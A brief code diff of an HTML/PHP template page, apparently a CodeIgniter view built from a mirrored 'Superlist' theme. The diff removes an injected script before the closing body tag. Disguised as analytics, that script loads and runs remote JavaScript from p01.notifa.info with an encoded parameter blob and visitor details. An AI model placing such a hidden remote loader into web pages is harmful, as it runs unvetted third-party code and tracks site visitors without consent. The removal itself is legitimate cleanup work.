@@ -31,7 +31,7 @@
 
 <script src="<?php echo base_url()?>assets/superlist/assets/js/superlist.js" type="text/javascript"></script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2wqW%2bdGij7b9KKJfREsIkXGE%2bu54nFSht6dO5J5xURYc6YTztC7jWHiRMkvMdJD4PXIXH0f41fqPDltH8maJuJXWhnU17ChRyl%2fESA11VRCPE5yOfBAGF%2favNwmhZUv1mlMVN6TO%2fOkPqaD0Tz9bQKwWs06Ehp0jtvk7HV3adklHeFldUKalSxvL2iKje32DvbQsigX7OKDVC7f6hwSSLFZOFwFJ3L5oWjr5t2Y62DoLqzN6tf1EQLqs6qJHSUgXd61i27BFr%2flWETtVqw5j3c7lMfvqmyo3fwx%2bpxr4nlYBfpRz2C32KMg90e7t3pyJ5ynzLTM9h%2b0cWPuTG8tXU7p%2fWUJGxcT6ORjhPDwEbXbHorxy%2bhL1swgQ1cd%2bWW57yiLAx8hV5glcyXqgGB21xD91saT4Sl5j41QXNQHwEVTqALHnE0cg6Yq5yu46jT8Vgtvjq57Irtp21pWJG%2frTZIuQrsfqFslL2XrOOqOzsPNkFtD5iLJMoAVA6PgTOtmpf" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
 
 
 <!-- Mirrored from preview.byaviators.com/template/superlist/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 15 Aug 2019 09:20:35 GMT -->
